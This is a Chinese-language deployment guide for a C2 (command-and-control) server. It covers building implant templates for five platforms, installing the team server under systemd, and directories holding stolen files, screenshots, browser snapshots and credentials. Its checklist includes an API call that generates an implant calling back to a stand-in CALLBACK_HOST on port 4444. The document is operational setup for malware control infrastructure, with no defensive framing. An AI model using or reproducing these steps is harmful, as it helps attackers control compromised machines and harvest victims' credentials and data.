# 部署（Linux 单机）

服务端是**单个静态二进制**：前端（`webui/dist` 经 `go:embed`）与五平台载荷模板（`implant/templates`）都编在里面，目标机不需要 Node、Go、Docker。

## 目标机要求

- Linux x86_64 / arm64，systemd
- 一个对外可访问的 TCP 端口给控制台，另一批端口给监听器（回连）
- 放行方式：主机防火墙（ufw/firewalld）**和**云安全组两处都要开

## 1. 本地构建

```bash
# 载荷模板：五平台 stub，编进服务端二进制，目标机因此不需要工具链
make -C implant                                   # Windows C 植入端（需 mingw）
cp -f implant/implant.exe implant/templates/windows-x64.exe
for t in linux/amd64 linux/arm64 darwin/amd64 darwin/arm64; do
  CGO_ENABLED=0 GOOS=${t%/*} GOARCH=${t#*/} \
    go build -trimpath -ldflags '-s -w -buildid=' -o "implant/templates/${t%/*}-${t#*/}" ./cmd/implant
done

# 服务端（会嵌入上面的模板和 webui/dist）
make web                                          # 仅前端有改动时需要
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
  go build -trimpath -ldflags '-s -w -buildid=' -o bin/server ./cmd/server
```

## 2. 上线

```bash
ssh root@TARGET
mkdir -p /opt/c2-platform/{bin,conf,data}
chmod 700 /opt/c2-platform/data
# 上传 bin/server 与 conf/setting.conf（0600）
```

`conf/setting.conf`：

```ini
web_title=C2 Workbench
web_ip=0.0.0.0
web_port=8082
web_username=admin
web_password=<24 位随机串>
web_jwt_secret=<64 位 hex，留空则每次重启失效>
log_level=6
```

`/etc/systemd/system/c2-platform.service`：

```ini
[Unit]
Description=C2 Workbench (team server + console)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=/opt/c2-platform
ExecStart=/opt/c2-platform/bin/server -config /opt/c2-platform/conf/setting.conf
Restart=always
RestartSec=3s
LimitNOFILE=65535
Environment=HOME=/root
StandardOutput=journal
StandardError=journal
SyslogIdentifier=c2-platform

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload && systemctl enable --now c2-platform
systemctl status c2-platform --no-pager
ss -lntp | grep 8082
curl -sS -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8082/
```

## 3. 目录与日志

| 路径 | 内容 |
| --- | --- |
| `/opt/c2-platform/bin/server` | 服务端二进制 |
| `/opt/c2-platform/conf/setting.conf` | 账号 / JWT / 端口，`0600` |
| `/opt/c2-platform/data/payloads` | 生成的载荷与历史 |
| `/opt/c2-platform/data/stash`、`data/shots` | 文件暂存、屏幕截取 |
| `/opt/c2-platform/data/browser`、`data/creds` | 主机浏览器快照、凭据库（`0600`） |
| `journalctl -u c2-platform -f` | 运行日志 |

## 4. 升级

```bash
systemctl stop c2-platform
# 覆盖 bin/server（data/ 与 conf/ 不动）
systemctl start c2-platform
```

配置与数据都按相对路径解析，`WorkingDirectory=/opt/c2-platform` 决定 `data/` 落在哪，换机时整目录打包即可。

## 5. 验收清单

```bash
curl -sS -o /dev/null -w 'index=%{http_code}\n' http://127.0.0.1:8082/
# 前端资源：index.html 里引用的 /assets/index-*.js 必须 200
TOK=$(curl -sS -X POST http://127.0.0.1:8082/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<pw>"}' | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')
curl -sS http://127.0.0.1:8082/api/payloads -H "Authorization: Bearer $TOK" | head -c 300
# 载荷生成：targets 全部 ready，language go 应显示「内嵌预编译模板打补丁（无需工具链）」
curl -sS -X POST http://127.0.0.1:8082/api/payloads -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"host":"CALLBACK_HOST","port":4444,"filename":"probe","target":"linux-amd64","language":"go","techniques":[]}'
# 崩溃自愈：kill 掉进程后 systemd 应在 3 秒内拉起
kill -9 $(systemctl show -p MainPID --value c2-platform); sleep 4; systemctl is-active c2-platform
```

## 6. 注意事项

- 控制台是**明文 HTTP**，口令只在登录请求里出现一次、之后走 JWT。要长期对公网开放，建议在反代上加 TLS，或把安全组来源限制到自己的出口 IP。
- 监听器端口（回连端口）同样需要在安全组放行，否则目标机连不进来。
- 服务端不监听回连端口以外的任何端口；`data/` 为 `0700`，凭据文件 `0600`。
- 载荷生成不依赖目标机工具链是**内嵌模板**带来的：二进制里带了五平台 stub，因此本机没有 Go/UPX/Garble 时，载荷页会显示「内置模板（无需编译器）」。想要 Garble 混淆或自定义 ldflags，仍需在服务端装 Go 工具链并放源码树。
